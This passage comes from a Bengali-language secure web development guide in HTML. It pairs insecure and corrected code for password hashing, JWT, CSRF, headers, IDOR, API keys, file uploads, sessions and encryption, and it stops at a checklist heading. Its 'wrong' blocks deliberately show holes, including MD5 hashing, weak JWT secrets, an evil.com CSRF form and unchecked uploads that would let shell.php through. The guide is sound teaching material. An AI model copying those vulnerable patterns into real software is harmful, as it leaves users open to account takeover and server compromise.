+<span class="comment">// MD5 (ক্র্যাক করা সহজ):</span>
+<span class="var">$save</span> = <span class="fn">md5</span>(<span class="var">$pass</span>);
+
+<span class="comment">// SHA1 (অনিরাপদ):</span>
+<span class="var">$save</span> = <span class="fn">sha1</span>(<span class="var">$pass</span>);</pre>
+        </div>
+        <div class="code-block">
+          <div class="code-label good">✅ সঠিক পদ্ধতি (bcrypt)</div>
+          <pre><span class="comment">// bcrypt ব্যবহার করুন:</span>
+<span class="var">$pass</span> = <span class="var">$_POST</span>[<span class="str">'password'</span>];
+
+<span class="comment">// হ্যাশ তৈরি:</span>
+<span class="var">$hash</span> = <span class="fn">password_hash</span>(
+  <span class="var">$pass</span>, 
+  PASSWORD_BCRYPT,
+  [<span class="str">'cost'</span> => <span class="num">12</span>]
+);
+
+<span class="comment">// যাচাই করা:</span>
+<span class="kw">if</span> (<span class="fn">password_verify</span>(<span class="var">$pass</span>, <span class="var">$hash</span>)) {
+  <span class="comment">// লগইন সফল</span>
+}</pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="tab-content" id="hash-py">
+      <div class="code-pair">
+        <div class="code-block">
+          <div class="code-label bad">❌ ভুল পদ্ধতি</div>
+          <pre><span class="kw">import</span> hashlib
+<span class="comment"># MD5 অনিরাপদ!</span>
+hashed = hashlib.<span class="fn">md5</span>(
+  password.<span class="fn">encode</span>()
+).<span class="fn">hexdigest</span>()</pre>
+        </div>
+        <div class="code-block">
+          <div class="code-label good">✅ সঠিক পদ্ধতি</div>
+          <pre"><span class="kw">import</span> bcrypt
+
+<span class="comment"># হ্যাশ তৈরি:</span>
+hashed = bcrypt.<span class="fn">hashpw</span>(
+  password.<span class="fn">encode</span>(), 
+  bcrypt.<span class="fn">gensalt</span>(rounds=<span class="num">12</span>)
+)
+
+<span class="comment"># যাচাই:</span>
+bcrypt.<span class="fn">checkpw</span>(
+  password.<span class="fn">encode</span>(), hashed
+)</pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="tab-content" id="hash-node">
+      <div class="code-pair">
+        <div class="code-block">
+          <div class="code-label bad">❌ ভুল পদ্ধতি</div>
+          <pre><span class="kw">const</span> crypto = <span class="fn">require</span>(<span class="str">'crypto'</span>);
+<span class="comment">// SHA256 একা যথেষ্ট নয়!</span>
+<span class="kw">const</span> hash = crypto
+  .<span class="fn">createHash</span>(<span class="str">'sha256'</span>)
+  .<span class="fn">update</span>(password)
+  .<span class="fn">digest</span>(<span class="str">'hex'</span>);</pre>
+        </div>
+        <div class="code-block">
+          <div class="code-label good">✅ সঠিক পদ্ধতি</div>
+          <pre><span class="kw">const</span> bcrypt = <span class="fn">require</span>(<span class="str">'bcrypt'</span>);
+
+<span class="comment">// হ্যাশ তৈরি:</span>
+<span class="kw">const</span> hash = <span class="kw">await</span> bcrypt.<span class="fn">hash</span>(
+  password, <span class="num">12</span>
+);
+
+<span class="comment">// যাচাই:</span>
+<span class="kw">const</span> ok = <span class="kw">await</span> bcrypt.<span class="fn">compare</span>(
+  password, hash
+);</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="vuln-card high">
+    <div class="vuln-header">
+      <div class="vuln-title">JWT টোকেন সিকিউরিটি</div>
+      <span class="badge high">উচ্চ</span>
+    </div>
+    <div class="vuln-desc">ভুল JWT কনফিগারেশন টোকেন জাল করার সুযোগ দেয়।</div>
+    <div class="code-pair">
+      <div class="code-block">
+        <div class="code-label bad">❌ বিপজ্জনক</div>
+        <pre><span class="comment">// দুর্বল সিক্রেট:</span>
+jwt.<span class="fn">sign</span>(payload, <span class="str">'secret'</span>)
+jwt.<span class="fn">sign</span>(payload, <span class="str">'123456'</span>)
+
+<span class="comment">// Algorithm none আক্রমণ:
+// header: {"alg":"none"}
+// তাহলে যেকোনো টোকেন valid!</span>
+
+<span class="comment">// এক্সপায়ারি ছাড়া:</span>
+jwt.<span class="fn">sign</span>(payload, secret)
+<span class="comment">// চিরকাল valid থাকবে!</span></pre>
+      </div>
+      <div class="code-block">
+        <div class="code-label good">✅ নিরাপদ JWT</div>
+        <pre"><span class="comment">// শক্তিশালী সিক্রেট + নির্দিষ্ট algorithm:</span>
+<span class="kw">const</span> token = jwt.<span class="fn">sign</span>(
+  { userId: user.id, role: user.role },
+  process.env.JWT_SECRET, <span class="comment">// env থেকে</span>
+  { 
+    algorithm: <span class="str">'HS256'</span>,
+    expiresIn: <span class="str">'15m'</span>, <span class="comment">// সংক্ষিপ্ত!</span>
+    issuer: <span class="str">'yourapp.com'</span>
+  }
+);
+
+<span class="comment">// যাচাই করার সময় algorithm নির্দিষ্ট করুন:</span>
+jwt.<span class="fn">verify</span>(token, secret, {
+  algorithms: [<span class="str">'HS256'</span>]
+});</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="vuln-card medium">
+    <div class="vuln-header">
+      <div class="vuln-title">ব্রুট ফোর্স সুরক্ষা</div>
+      <span class="badge medium">মধ্যম</span>
+    </div>
+    <div class="vuln-desc">বারবার লগইন চেষ্টা করে পাসওয়ার্ড অনুমান করা আটকান।</div>
+    <div class="code-block">
+      <div class="code-label good">✅ Rate Limiting + Account Lockout</div>
+      <pre><span class="kw">const</span> rateLimit = <span class="fn">require</span>(<span class="str">'express-rate-limit'</span>);
+
+<span class="comment">// লগইন রুটে রেট লিমিট:</span>
+<span class="kw">const</span> loginLimiter = <span class="fn">rateLimit</span>({
+  windowMs: <span class="num">15</span> * <span class="num">60</span> * <span class="num">1000</span>, <span class="comment">// ১৫ মিনিট</span>
+  max: <span class="num">5</span>,                    <span class="comment">// সর্বোচ্চ ৫ বার</span>
+  message: { 
+    error: <span class="str">'অনেকবার ব্যর্থ! ১৫ মিনিট অপেক্ষা করুন।'</span>
+  },
+  standardHeaders: <span class="kw">true</span>,
+  legacyHeaders: <span class="kw">false</span>
+});
+
+app.<span class="fn">post</span>(<span class="str">'/login'</span>, loginLimiter, loginController);
+
+<span class="comment">// অতিরিক্ত: অ্যাকাউন্ট লক (৫ বার ব্যর্থের পর)</span>
+<span class="kw">if</span> (user.failedAttempts >= <span class="num">5</span>) {
+  user.lockedUntil = <span class="kw">new</span> <span class="fn">Date</span>(<span class="fn">Date</span>.<span class="fn">now</span>() + <span class="num">30</span>*<span class="num">60</span>*<span class="num">1000</span>);
+  <span class="comment">// + ইমেইল নোটিফিকেশন পাঠান</span>
+}</pre>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════ -->
+<!-- 04. CSRF -->
+<!-- ═══════════════════════════════════════════ -->
+<section class="section fade-in" id="csrf">
+  <div class="section-header">
+    <div class="section-icon" style="background:rgba(255,215,0,0.12)">🎭</div>
+    <div>
+      <div class="section-title">CSRF (Cross-Site Request Forgery)</div>
+      <div class="section-subtitle">ইউজারের অজ্ঞাতে অ্যাকশন করানো</div>
+    </div>
+    <span class="badge high">উচ্চ ঝুঁকি</span>
+  </div>
+
+  <div class="info-box warning">
+    <strong>⚠ কীভাবে কাজ করে?</strong>
+    আক্রমণকারী একটি ক্ষতিকর সাইট বানায়। লগইন থাকা ইউজার ওই সাইটে গেলে, সেই সাইট আপনার ব্যাংক অ্যাকাউন্টে স্বয়ংক্রিয় অর্থ ট্রান্সফার রিকোয়েস্ট পাঠায়!
+  </div>
+
+  <div class="vuln-card high">
+    <div class="vuln-header">
+      <div class="vuln-title">CSRF টোকেন দিয়ে সুরক্ষা</div>
+      <span class="badge high">সমাধান</span>
+    </div>
+    <div class="code-pair">
+      <div class="code-block">
+        <div class="code-label bad">❌ CSRF ঝুঁকিপূর্ণ ফর্ম</div>
+        <pre><span class="comment">&lt;!-- কোনো CSRF সুরক্ষা নেই --&gt;</span>
+&lt;form action=<span class="str">"/transfer"</span> 
+      method=<span class="str">"POST"</span>&gt;
+  &lt;input name=<span class="str">"amount"</span> 
+         value=<span class="str">"50000"</span>&gt;
+  &lt;input name=<span class="str">"to"</span> 
+         value=<span class="str">"attacker"</span>&gt;
+  &lt;button&gt;পাঠান&lt;/button&gt;
+&lt;/form&gt;
+
+<span class="comment">&lt;!-- evil.com এ hidden form
+     autosubmit করলেই টাকা যাবে! --&gt;</span></pre>
+      </div>
+      <div class="code-block">
+        <div class="code-label good">✅ CSRF টোকেনসহ ফর্ম</div>
+        <pre><span class="comment">&lt;!-- PHP: CSRF টোকেন জেনারেট --&gt;</span>
+&lt;?php
+<span class="var">$token</span> = <span class="fn">bin2hex</span>(<span class="fn">random_bytes</span>(<span class="num">32</span>));
+<span class="var">$_SESSION</span>[<span class="str">'csrf'</span>] = <span class="var">$token</span>;
+?&gt;
+
+&lt;form action=<span class="str">"/transfer"</span> method=<span class="str">"POST"</span>&gt;
+  &lt;input type=<span class="str">"hidden"</span> 
+    name=<span class="str">"_csrf"</span>
+    value=<span class="str">"&lt;?= $token ?&gt;"</span>&gt;
+  &lt;input name=<span class="str">"amount"</span>&gt;
+  &lt;button&gt;পাঠান&lt;/button&gt;
+&lt;/form&gt;
+
+<span class="comment">&lt;?php
+// সার্ভারে যাচাই:
+if ($_POST['_csrf'] !== $_SESSION['csrf']) {
+    die('CSRF detected!');
+}
+?&gt;</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="vuln-card medium">
+    <div class="vuln-header">
+      <div class="vuln-title">SameSite Cookie</div>
+      <span class="badge medium">সহজ সমাধান</span>
+    </div>
+    <div class="code-block">
+      <div class="code-label good">✅ SameSite Cookie সেট করুন</div>
+      <pre><span class="comment">// Express.js:</span>
+app.<span class="fn">use</span>(session({
+  secret: process.env.SESSION_SECRET,
+  cookie: {
+    httpOnly: <span class="kw">true</span>,      <span class="comment">// JS দিয়ে পড়া যাবে না</span>
+    secure: <span class="kw">true</span>,        <span class="comment">// শুধু HTTPS</span>
+    sameSite: <span class="str">'strict'</span>,  <span class="comment">// CSRF ব্লক!</span>
+    maxAge: <span class="num">15</span> * <span class="num">60</span> * <span class="num">1000</span> <span class="comment">// ১৫ মিনিট</span>
+  }
+}));
+
+<span class="comment">// PHP:</span>
+<span class="fn">setcookie</span>(<span class="str">'session'</span>, <span class="var">$value</span>, [
+  <span class="str">'httponly'</span> => <span class="kw">true</span>,
+  <span class="str">'secure'</span>   => <span class="kw">true</span>,
+  <span class="str">'samesite'</span> => <span class="str">'Strict'</span>
+]);</pre>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════ -->
+<!-- 05. HTTP HEADERS -->
+<!-- ═══════════════════════════════════════════ -->
+<section class="section fade-in" id="headers">
+  <div class="section-header">
+    <div class="section-icon" style="background:rgba(0,212,255,0.12)">📋</div>
+    <div>
+      <div class="section-title">HTTP সিকিউরিটি হেডার</div>
+      <div class="section-subtitle">ব্রাউজারকে নিরাপত্তার নির্দেশনা দিন</div>
+    </div>
+    <span class="badge medium">গুরুত্বপূর্ণ</span>
+  </div>
+
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <th>হেডার</th>
+          <th>উদ্দেশ্য</th>
+          <th>প্রস্তাবিত মান</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code style="color:var(--accent);font-family:'JetBrains Mono',monospace">Strict-Transport-Security</code></td>
+          <td>শুধুমাত্র HTTPS বাধ্য করে</td>
+          <td><code style="color:var(--green);font-family:'JetBrains Mono',monospace;font-size:0.78rem">max-age=31536000; includeSubDomains</code></td>
+        </tr>
+        <tr>
+          <td><code style="color:var(--accent);font-family:'JetBrains Mono',monospace">X-Content-Type-Options</code></td>
+          <td>MIME sniffing ব্লক</td>
+          <td><code style="color:var(--green);font-family:'JetBrains Mono',monospace;font-size:0.78rem">nosniff</code></td>
+        </tr>
+        <tr>
+          <td><code style="color:var(--accent);font-family:'JetBrains Mono',monospace">X-Frame-Options</code></td>
+          <td>Clickjacking সুরক্ষা</td>
+          <td><code style="color:var(--green);font-family:'JetBrains Mono',monospace;font-size:0.78rem">DENY</code></td>
+        </tr>
+        <tr>
+          <td><code style="color:var(--accent);font-family:'JetBrains Mono',monospace">Content-Security-Policy</code></td>
+          <td>XSS ও data injection সুরক্ষা</td>
+          <td><code style="color:var(--green);font-family:'JetBrains Mono',monospace;font-size:0.78rem">default-src 'self'</code></td>
+        </tr>
+        <tr>
+          <td><code style="color:var(--accent);font-family:'JetBrains Mono',monospace">Referrer-Policy</code></td>
+          <td>URL তথ্য লিক প্রতিরোধ</td>
+          <td><code style="color:var(--green);font-family:'JetBrains Mono',monospace;font-size:0.78rem">strict-origin-when-cross-origin</code></td>
+        </tr>
+        <tr>
+          <td><code style="color:var(--accent);font-family:'JetBrains Mono',monospace">Permissions-Policy</code></td>
+          <td>ব্রাউজার ফিচার নিয়ন্ত্রণ</td>
+          <td><code style="color:var(--green);font-family:'JetBrains Mono',monospace;font-size:0.78rem">camera=(), microphone=()</code></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="vuln-card low">
+    <div class="vuln-header">
+      <div class="vuln-title">Node.js/Express সম্পূর্ণ হেডার কনফিগারেশন</div>
+      <span class="badge low">Helmet.js</span>
+    </div>
+    <div class="code-block">
+      <div class="code-label good">✅ Helmet.js দিয়ে সব হেডার একসাথে</div>
+      <pre><span class="kw">const</span> helmet = <span class="fn">require</span>(<span class="str">'helmet'</span>);
+
+app.<span class="fn">use</span>(<span class="fn">helmet</span>({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: [<span class="str">"'self'"</span>],
+      scriptSrc: [<span class="str">"'self'"</span>],
+      styleSrc: [<span class="str">"'self'"</span>, <span class="str">"'unsafe-inline'"</span>],
+      imgSrc: [<span class="str">"'self'"</span>, <span class="str">"data:"</span>, <span class="str">"https:"</span>],
+      connectSrc: [<span class="str">"'self'"</span>],
+      fontSrc: [<span class="str">"'self'"</span>],
+      objectSrc: [<span class="str">"'none'"</span>],
+      upgradeInsecureRequests: [],
+    },
+  },
+  hsts: {
+    maxAge: <span class="num">31536000</span>,
+    includeSubDomains: <span class="kw">true</span>,
+    preload: <span class="kw">true</span>
+  },
+  frameguard: { action: <span class="str">'deny'</span> },
+  noSniff: <span class="kw">true</span>,
+  referrerPolicy: { policy: <span class="str">'strict-origin-when-cross-origin'</span> }
+}));</pre>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════ -->
+<!-- 06. API SECURITY -->
+<!-- ═══════════════════════════════════════════ -->
+<section class="section fade-in" id="api">
+  <div class="section-header">
+    <div class="section-icon" style="background:rgba(0,255,136,0.1)">🔌</div>
+    <div>
+      <div class="section-title">API সিকিউরিটি</div>
+      <div class="section-subtitle">REST API নিরাপদ রাখার সম্পূর্ণ গাইড</div>
+    </div>
+    <span class="badge high">উচ্চ গুরুত্ব</span>
+  </div>
+
+  <div class="vuln-card critical">
+    <div class="vuln-header">
+      <div class="vuln-title">Broken Object Level Authorization (BOLA/IDOR)</div>
+      <span class="badge critical">ক্রিটিকাল</span>
+    </div>
+    <div class="vuln-desc">URL-এ অন্যের ID দিলে তাদের ডেটা দেখা যাওয়া — OWASP API Top 1।</div>
+    <div class="code-pair">
+      <div class="code-block">
+        <div class="code-label bad">❌ IDOR দুর্বলতা</div>
+        <pre><span class="comment">// GET /api/orders/1234
+// ইউজার ১ অর্ডার ২ দেখতে পারে!</span>
+
+app.<span class="fn">get</span>(<span class="str">'/api/orders/:id'</span>, 
+  async (req, res) => {
+    <span class="comment">// শুধু ID দিয়ে খোঁজা:</span>
+    <span class="kw">const</span> order = <span class="kw">await</span> Order.<span class="fn">findById</span>(
+      req.params.id
+    );
+    <span class="comment">// মালিক চেক নেই! যেকেউ দেখতে পারে</span>
+    res.<span class="fn">json</span>(order);
+  }
+);</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-label good">✅ Authorization চেক</div>
+        <pre><span class="comment">// সঠিক পদ্ধতি: user ID দিয়েও চেক</span>
+app.<span class="fn">get</span>(<span class="str">'/api/orders/:id'</span>,
+  authMiddleware, <span class="comment">// প্রথমে auth</span>
+  async (req, res) => {
+    <span class="kw">const</span> order = <span class="kw">await</span> Order.<span class="fn">findOne</span>({
+      _id: req.params.id,
+      <span class="comment">// ইউজারের অর্ডার কিনা চেক!</span>
+      userId: req.user.id
+    });
+    
+    <span class="kw">if</span> (!order) {
+      <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">404</span>).<span class="fn">json</span>(
+        { error: <span class="str">'পাওয়া যায়নি'</span> }
+      );
+    }
+    res.<span class="fn">json</span>(order);
+  }
+);</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="vuln-card high">
+    <div class="vuln-header">
+      <div class="vuln-title">API Key নিরাপত্তা</div>
+      <span class="badge high">উচ্চ</span>
+    </div>
+    <div class="code-pair">
+      <div class="code-block">
+        <div class="code-label bad">❌ ভুল পদ্ধতি</div>
+        <pre><span class="comment">// কখনো হার্ডকোড করবেন না!</span>
+<span class="kw">const</span> apiKey = <span class="str">'sk-1234abcd...'</span>;
+<span class="kw">const</span> dbUrl = <span class="str">'mongodb://user:pass@host'</span>;
+
+<span class="comment">// GitHub-এ push = চুরি নিশ্চিত!</span>
+
+<span class="comment">// Client-side এ কখনো না:</span>
+&lt;script&gt;
+  <span class="kw">const</span> KEY = <span class="str">'my-secret-key'</span>;
+&lt;/script&gt;</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-label good">✅ Environment Variable</div>
+        <pre"><span class="comment"># .env ফাইলে (gitignore করুন!)</span>
+API_KEY=sk-1234abcd...
+DB_URL=mongodb://user:pass@host
+JWT_SECRET=very-long-random-string
+
+<span class="comment">// Node.js এ ব্যবহার:</span>
+<span class="fn">require</span>(<span class="str">'dotenv'</span>).<span class="fn">config</span>();
+<span class="kw">const</span> apiKey = process.env.API_KEY;
+
+<span class="comment"># .gitignore এ অবশ্যই যোগ করুন:</span>
+.env
+.env.local
+.env.production</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="vuln-card medium">
+    <div class="vuln-header">
+      <div class="vuln-title">Input Validation ও Sanitization</div>
+      <span class="badge medium">মধ্যম</span>
+    </div>
+    <div class="code-block">
+      <div class="code-label good">✅ Joi দিয়ে সম্পূর্ণ ভ্যালিডেশন</div>
+      <pre><span class="kw">const</span> Joi = <span class="fn">require</span>(<span class="str">'joi'</span>);
+
+<span class="comment">// Schema সংজ্ঞা:</span>
+<span class="kw">const</span> registerSchema = Joi.<span class="fn">object</span>({
+  name: Joi.string()
+    .<span class="fn">min</span>(<span class="num">2</span>).<span class="fn">max</span>(<span class="num">50</span>)
+    .<span class="fn">pattern</span>(<span class="str">/^[\u0980-\u09FF\s]+$/</span>) <span class="comment">// বাংলা</span>
+    .required(),
+  email: Joi.string()
+    .<span class="fn">email</span>()
+    .<span class="fn">lowercase</span>()
+    .required(),
+  age: Joi.<span class="fn">number</span>()
+    .<span class="fn">integer</span>().<span class="fn">min</span>(<span class="num">18</span>).<span class="fn">max</span>(<span class="num">120</span>)
+    .required(),
+  phone: Joi.string()
+    .<span class="fn">pattern</span>(<span class="str">/^01[3-9]\d{8}$/</span>) <span class="comment">// BD নম্বর</span>
+    .required()
+});
+
+<span class="comment">// Middleware:</span>
+<span class="kw">const</span> { error } = registerSchema.<span class="fn">validate</span>(req.body);
+<span class="kw">if</span> (error) {
+  <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">400</span>).<span class="fn">json</span>({
+    error: error.details[<span class="num">0</span>].message
+  });
+}</pre>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════ -->
+<!-- 07. FILE UPLOAD -->
+<!-- ═══════════════════════════════════════════ -->
+<section class="section fade-in" id="upload">
+  <div class="section-header">
+    <div class="section-icon" style="background:rgba(255,107,53,0.15)">📁</div>
+    <div>
+      <div class="section-title">ফাইল আপলোড সিকিউরিটি</div>
+      <div class="section-subtitle">ক্ষতিকর ফাইল আপলোড প্রতিরোধ</div>
+    </div>
+    <span class="badge high">উচ্চ ঝুঁকি</span>
+  </div>
+
+  <div class="info-box danger">
+    <strong>🚨 আক্রমণের ধরন</strong>
+    shell.php নামের ফাইল আপলোড করে সার্ভারে shell access নেওয়া — সার্ভার সম্পূর্ণ কব্জা!
+  </div>
+
+  <div class="vuln-card critical">
+    <div class="vuln-header">
+      <div class="vuln-title">নিরাপদ ফাইল আপলোড</div>
+      <span class="badge low">সমাধান</span>
+    </div>
+    <div class="code-pair">
+      <div class="code-block">
+        <div class="code-label bad">❌ বিপজ্জনক</div>
+        <pre><span class="comment">// কোনো চেক ছাড়া আপলোড:</span>
+app.<span class="fn">post</span>(<span class="str">'/upload'</span>, (req, res) => {
+  <span class="kw">const</span> file = req.files.file;
+  <span class="comment">// সরাসরি web-accessible ফোল্ডারে!</span>
+  file.<span class="fn">mv</span>(<span class="str">`./public/${file.name}`</span>);
+  
+  <span class="comment">// evil.php আপলোড = সার্ভার হ্যাক!</span>
+});</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-label good">✅ নিরাপদ আপলোড</div>
+        <pre><span class="kw">const</span> multer = <span class="fn">require</span>(<span class="str">'multer'</span>);
+<span class="kw">const</span> path = <span class="fn">require</span>(<span class="str">'path'</span>);
+<span class="kw">const</span> crypto = <span class="fn">require</span>(<span class="str">'crypto'</span>);
+
+<span class="kw">const</span> upload = multer({
+  limits: { fileSize: <span class="num">5</span> * <span class="num">1024</span> * <span class="num">1024</span> }, <span class="comment">// 5MB</span>
+  fileFilter: (req, file, cb) => {
+    <span class="kw">const</span> allowed = [<span class="str">'.jpg'</span>, <span class="str">'.png'</span>, <span class="str">'.pdf'</span>];
+    <span class="kw">const</span> ext = path.<span class="fn">extname</span>(file.originalname)
+      .<span class="fn">toLowerCase</span>();
+    
+    <span class="comment">// MIME type চেক:</span>
+    <span class="kw">const</span> okMime = [<span class="str">'image/jpeg'</span>, <span class="str">'image/png'</span>];
+    <span class="kw">if</span> (!allowed.<span class="fn">includes</span>(ext) || 
+        !okMime.<span class="fn">includes</span>(file.mimetype)) {
+      <span class="kw">return</span> <span class="fn">cb</span>(<span class="kw">new</span> <span class="fn">Error</span>(<span class="str">'অননুমোদিত ফাইল!'</span>));
+    }
+    <span class="fn">cb</span>(<span class="kw">null</span>, <span class="kw">true</span>);
+  },
+  storage: multer.<span class="fn">diskStorage</span>({
+    destination: <span class="str">'./uploads'</span>, <span class="comment">// public এর বাইরে!</span>
+    filename: (req, file, cb) => {
+      <span class="comment">// র‍্যান্ডম নাম:</span>
+      <span class="kw">const</span> name = crypto.<span class="fn">randomUUID</span>() + 
+        path.<span class="fn">extname</span>(file.originalname);
+      <span class="fn">cb</span>(<span class="kw">null</span>, name);
+    }
+  })
+});</pre>
+      </div>
+    </div>
+    <div class="info-box tip">
+      <strong>✅ অতিরিক্ত সুরক্ষা</strong>
+      ফাইল সার্ভার করার সময় Content-Disposition: attachment হেডার ব্যবহার করুন। ছবি হলে আবার রি-প্রসেস করুন (sharp লাইব্রেরি)। ক্লাউড স্টোরেজ (S3) ব্যবহার করুন।
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════ -->
+<!-- 08. SESSION -->
+<!-- ═══════════════════════════════════════════ -->
+<section class="section fade-in" id="session">
+  <div class="section-header">
+    <div class="section-icon" style="background:rgba(124,58,237,0.15)">🍪</div>
+    <div>
+      <div class="section-title">সেশন ম্যানেজমেন্ট</div>
+      <div class="section-subtitle">সেশন হাইজ্যাকিং প্রতিরোধ</div>
+    </div>
+    <span class="badge high">উচ্চ</span>
+  </div>
+
+  <div class="vuln-card high">
+    <div class="vuln-header">
+      <div class="vuln-title">নিরাপদ সেশন কনফিগারেশন</div>
+    </div>
+    <div class="code-pair">
+      <div class="code-block">
+        <div class="code-label bad">❌ দুর্বল সেশন</div>
+        <pre><span class="comment">// দুর্বল সেশন আইডি:</span>
+session_id = user.id + timestamp
+<span class="comment">// অনুমানযোগ্য!
+
+// লগআউটে সেশন ধ্বংস না করা:
+</span>app.<span class="fn">post</span>(<span class="str">'/logout'</span>, (req, res) => {
+  <span class="comment">// শুধু কুকি মুছলেই হবে না!</span>
+  res.<span class="fn">clearCookie</span>(<span class="str">'session'</span>);
+  res.<span class="fn">redirect</span>(<span class="str">'/'</span>);
+});</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-label good">✅ নিরাপদ সেশন</div>
+        <pre"><span class="comment">// Express session নিরাপদ কনফিগ:</span>
+app.<span class="fn">use</span>(session({
+  secret: process.env.SESSION_SECRET,
+  resave: <span class="kw">false</span>,
+  saveUninitialized: <span class="kw">false</span>,
+  <span class="comment">// র‍্যান্ডম, ক্রিপ্টো-শক্তিশালী ID:</span>
+  genid: () => crypto.<span class="fn">randomUUID</span>(),
+  cookie: {
+    httpOnly: <span class="kw">true</span>,
+    secure: <span class="kw">true</span>,
+    sameSite: <span class="str">'strict'</span>,
+    maxAge: <span class="num">15</span> * <span class="num">60</span> * <span class="num">1000</span>
+  }
+}));
+
+<span class="comment">// লগআউটে সার্ভার সেশন মুছুন:</span>
+app.<span class="fn">post</span>(<span class="str">'/logout'</span>, (req, res) => {
+  req.session.<span class="fn">destroy</span>(() => {
+    res.<span class="fn">clearCookie</span>(<span class="str">'connect.sid'</span>);
+    res.<span class="fn">redirect</span>(<span class="str">'/'</span>);
+  });
+});</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════ -->
+<!-- 09. CRYPTOGRAPHY -->
+<!-- ═══════════════════════════════════════════ -->
+<section class="section fade-in" id="crypto">
+  <div class="section-header">
+    <div class="section-icon" style="background:rgba(0,212,255,0.12)">🔐</div>
+    <div>
+      <div class="section-title">ক্রিপ্টোগ্রাফি ও ডেটা এনক্রিপশন</div>
+      <div class="section-subtitle">সংবেদনশীল ডেটা নিরাপদে সংরক্ষণ</div>
+    </div>
+    <span class="badge critical">ক্রিটিকাল</span>
+  </div>
+
+  <div class="table-wrap" style="margin-bottom:24px">
+    <table>
+      <thead>
+        <tr><th>উদ্দেশ্য</th><th>❌ ব্যবহার করবেন না</th><th>✅ ব্যবহার করুন</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>পাসওয়ার্ড হ্যাশ</td><td style="color:var(--red)">MD5, SHA1, SHA256</td><td style="color:var(--green)">bcrypt, Argon2, scrypt</td></tr>
+        <tr><td>সিমেট্রিক এনক্রিপশন</td><td style="color:var(--red)">DES, 3DES, RC4</td><td style="color:var(--green)">AES-256-GCM</td></tr>
+        <tr><td>এসিমেট্রিক</td><td style="color:var(--red)">RSA-1024</td><td style="color:var(--green)">RSA-2048+, ECDSA</td></tr>
+        <tr><td>TLS ভার্সন</td><td style="color:var(--red)">SSL, TLS 1.0, 1.1</td><td style="color:var(--green)">TLS 1.2, 1.3</td></tr>
+        <tr><td>র‍্যান্ডম নম্বর</td><td style="color:var(--red)">Math.random()</td><td style="color:var(--green)">crypto.randomBytes()</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="vuln-card medium">
+    <div class="vuln-header">
+      <div class="vuln-title">সংবেদনশীল ডেটা এনক্রিপশন (Node.js)</div>
+    </div>
+    <div class="code-block">
+      <div class="code-label good">✅ AES-256-GCM দিয়ে এনক্রিপশন</div>
+      <pre"><span class="kw">const</span> crypto = <span class="fn">require</span>(<span class="str">'crypto'</span>);
+
+<span class="kw">const</span> ALGORITHM = <span class="str">'aes-256-gcm'</span>;
+<span class="kw">const</span> KEY = Buffer.<span class="fn">from</span>(process.env.ENCRYPT_KEY, <span class="str">'hex'</span>);
+
+<span class="comment">// এনক্রিপ্ট:</span>
+<span class="kw">function</span> <span class="fn">encrypt</span>(text) {
+  <span class="kw">const</span> iv = crypto.<span class="fn">randomBytes</span>(<span class="num">16</span>);  <span class="comment">// প্রতিবার নতুন IV</span>
+  <span class="kw">const</span> cipher = crypto.<span class="fn">createCipheriv</span>(ALGORITHM, KEY, iv);
+  <span class="kw">const</span> encrypted = Buffer.<span class="fn">concat</span>([
+    cipher.<span class="fn">update</span>(text, <span class="str">'utf8'</span>),
+    cipher.<span class="fn">final</span>()
+  ]);
+  <span class="kw">const</span> authTag = cipher.<span class="fn">getAuthTag</span>();
+  <span class="kw">return</span> iv.<span class="fn">toString</span>(<span class="str">'hex'</span>) + <span class="str">':'</span> + 
+    encrypted.<span class="fn">toString</span>(<span class="str">'hex'</span>) + <span class="str">':'</span> + 
+    authTag.<span class="fn">toString</span>(<span class="str">'hex'</span>);
+}
+
+<span class="comment">// ডিক্রিপ্ট:</span>
+<span class="kw">function</span> <span class="fn">decrypt</span>(data) {
+  <span class="kw">const</span> [ivHex, encHex, tagHex] = data.<span class="fn">split</span>(<span class="str">':'</span>);
+  <span class="kw">const</span> decipher = crypto.<span class="fn">createDecipheriv</span>(
+    ALGORITHM, KEY, Buffer.<span class="fn">from</span>(ivHex, <span class="str">'hex'</span>)
+  );
+  decipher.<span class="fn">setAuthTag</span>(Buffer.<span class="fn">from</span>(tagHex, <span class="str">'hex'</span>));
+  <span class="kw">return</span> decipher.<span class="fn">update</span>(encHex, <span class="str">'hex'</span>, <span class="str">'utf8'</span>) + 
+    decipher.<span class="fn">final</span>(<span class="str">'utf8'</span>);
+}
+
+<span class="comment">// ব্যবহার:
+// জাতীয় পরিচয়পত্র নম্বর সংরক্ষণ:</span>
+<span class="kw">const</span> encryptedNID = <span class="fn">encrypt</span>(<span class="str">'1234567890123'</span>);
+<span class="comment">// db তে encryptedNID সংরক্ষণ করুন</span></pre>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════ -->
+<!-- 10. CHECKLIST -->
+<!-- ═══════════════════════════════════════════ -->
+<section class="section fade-in" id="checklist">
+  <div class="section-header">
+    <div class="section-icon" style="background:rgba(0,255,136,0.1)">✅</div>
+    <div>
+      <div class="section-title">সম্পূর্ণ সিকিউরিটি চেকলিস্ট</div>
